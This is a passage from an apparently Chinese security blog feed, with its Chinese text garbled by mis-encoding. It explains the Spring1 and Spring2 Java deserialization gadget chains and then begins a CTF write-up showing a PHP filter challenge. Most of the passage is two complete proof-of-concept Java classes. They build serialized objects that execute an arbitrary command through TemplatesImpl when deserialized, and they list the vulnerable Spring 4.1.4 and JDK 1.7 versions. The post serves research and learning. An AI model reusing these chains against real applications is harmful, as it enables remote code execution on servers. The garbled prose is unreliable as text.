class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>                <span class="hljs-keyword">return</span> toStringImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>                <span class="hljs-keyword">return</span> hashCodeImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>                <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>        <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>            <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>        <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>            result = cloneArray(result);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invoke</code>çš„è¿”å›å€¼åœ¨<code>memberValues</code>ä¸­æ‰¾ï¼Œkeyä¸º<code>method</code>æ–¹æ³•åã€‚å¯ä»¥è¿”å›ä»»æ„å¯¹è±¡ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>TypeProvider#getType</code>è¿”å›çš„æ˜¯<code>Type</code>æ¥å£ç±»ï¼Œæˆ‘ä»¬å¯ä»¥è®©ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»å»ä»£ç†<code>Type</code>æ¥å£ã€‚</p><p>ç”±äºæ¥ä¸‹æ¥<code>ReflectionUtils.invokeMethod(method, this.provider.getType());</code>è¦è°ƒç”¨<code>newTransformer</code>ï¼Œå› æ­¤æˆ‘ä»¬è¿™ä¸ªä»£ç†ç±»é™¤äº†ä»£ç†<code>Type</code>æ¥å£ç±»ï¼Œè¿˜å¾—ä»£ç†<code>Templates</code>æ¥å£ç±»ï¼ˆæ‰èƒ½è·å–åˆ°æ¥å£ç±»çš„æ–¹æ³•ï¼‰</p><p>è·å–åˆ°çš„åŠ¨æ€ä»£ç†ç±»Proxy1æœ‰å¦‚ä¸‹æ–¹æ³•ï¼š</p><p><img src="/2024/08/12/Spring/image-20240812230157822.png" alt="image-20240812230157822"></p><p>é‚£å¦‚ä½•è®©<code>TypeProvider#getType</code>è¿”å›æˆ‘ä»¬çš„<code>(Type)Proxy1</code>å‘¢ï¼Œä¹Ÿæ˜¯å†å¥—ä¸€å±‚åŠ¨æ€ä»£ç†ï¼Œä»£ç†<code>TypeProvider</code>æ¥å£ç±»ï¼Œåˆ©ç”¨<code>AnnotationInvocationHandler</code>è¿”å›<code>Proxy1</code>ï¼Œå³è®¾ç½®<code>memberValues.put(&quot;getType&quot;, Proxy1)</code></p><p><code>Proxy1</code>çš„è°ƒç”¨å¤„ç†å™¨è®¾ç½®ä¸º<code>ObjectFactoryDelegatingInvocationHandler</code>ï¼Œè¿™æ ·å°±èƒ½æŠŠ<code>newTransformer</code>çš„è°ƒç”¨å§”æ‰˜ç»™<code>ObjectFactory#getObject</code>çš„è¿”å›å¯¹è±¡å»è°ƒç”¨äº†ã€‚</p><p>è®©<code>ObjectFactory#getObject</code>è¿”å›<code>TemplatesImpl</code>å³å¯ï¼Œåˆ°æ­¤æœ‰ä¸¤æ¡è·¯å¯èµ°ï¼Œç»§ç»­å¥—åŠ¨æ€ä»£ç†æˆ–å¯»æ‰¾<code>ObjectFactory</code>çš„å®ç°ç±»ï¼ˆç¿»äº†ä¸€ä¸‹å‘ç°ä¸å¥½æ„é€ ï¼Œè¿˜æ˜¯æ²¡æœ‰åŠ¨æ€ä»£ç†æ¥å¾—ä¼˜é›…ï¼‰</p><p>ç»§ç»­å¥—ä¸€å±‚åŠ¨æ€ä»£ç†ï¼Œä»£ç†<code>ObjectFactory&lt;?&gt;</code>æ³›å‹æ¥å£ï¼Œåˆ©ç”¨<code>AnnotationInvocationHandler</code>è¿”å›<code>TemplatesImpl</code>ï¼Œå³è®¾ç½®<code>memberValues.put(&quot;getObject&quot;, TemplatesImpl)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        Class&lt;?&gt; clazz1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con1 = clazz1.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con1.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;String, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map1.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler1</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map1);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler1);<br><br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(factory);<br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><p>åœ¨Spring1é“¾åŸºç¡€ä¸Šæœ‰æ‰€å˜åŒ–ï¼ŒæŠŠ<code>spring-beans</code>çš„<code>ObjectFactoryDelegatingInvocationHandler</code>æ¢æˆ<code>spring-aop</code>çš„<code>JdkDynamicAopProxy</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkDynamicAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AopProxy</span>, InvocationHandler, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AdvisedSupport advised;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JdkDynamicAopProxy</span><span class="hljs-params">(AdvisedSupport config)</span> <span class="hljs-keyword">throws</span> AopConfigException &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-built_in">this</span>.advised = config;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/12/Spring/image-20240812230621109.png" alt="image-20240812230621109"></p><p><img src="/2024/08/12/Spring/image-20240812230629311.png" alt="image-20240812230629311"></p><p><code>JdkDynamicAopProxy</code>å°†æ–¹æ³•è°ƒç”¨å§”æ‰˜ç»™äº†<code>AdvisedSupport</code>çš„<code>target</code>æˆå‘˜</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        as.setTarget(templates);<br><br>        Class&lt;?&gt; clazz0 = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; con0 = clazz0.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con0.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">aopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con0.newInstance(as);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aopProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopInvocationHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, aopProxy);<br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(Target.class, map2);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>)&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä»¥ä¸ŠPOCä¾èµ–ç‰ˆæœ¬ï¼š</p><p>Â· spring-beans : 4.1.4.RELEASE</p><p>Â· spring-core : 4.1.4.RELEASE</p><p>Â· spring-aop : 4.1.4.RELEASE</p><p>Â· jdk 1.7</p><hr><p>ä¸‹é›†é¢„å‘Šï¼šè¶…çº§é‡å¤´æˆï¼Œ<strong>Hessian</strong>.</p><hr><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/spring">Spring | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">Java ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸‰ï¼‰ - CB&#x2F;Groovy&#x2F;Hibernate&#x2F;Spring | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jqctf-final</title>
    <link href="/2024/08/11/jqctf-final/"/>
    <url>/2024/08/11/jqctf-final/</url>
    
    <content type="html"><![CDATA[<p>å­¦é•¿ä»¬æ‰“åˆ°ç¬¬ä¸€äº†ï¼Œtqlã€‚</p><p>ç”±äºå¾ˆå¤šç¯èŠ‚éƒ½æ²¡æœ‰ï¼Œè¿™é‡Œå°±åšä¸ªç®€å•çš„wpè®°å½•ã€‚</p><h1 id="ldvim"><a href="#ldvim" class="headerlink" title="ldvim"></a>ldvim</h1><p>ç­¾åˆ°é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;filename&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||\\=|\\*|\\%|\\\^|\\(|\\)|&#123;|\\[|\\\\|&gt;|&lt;)/is&quot;</span>, <span 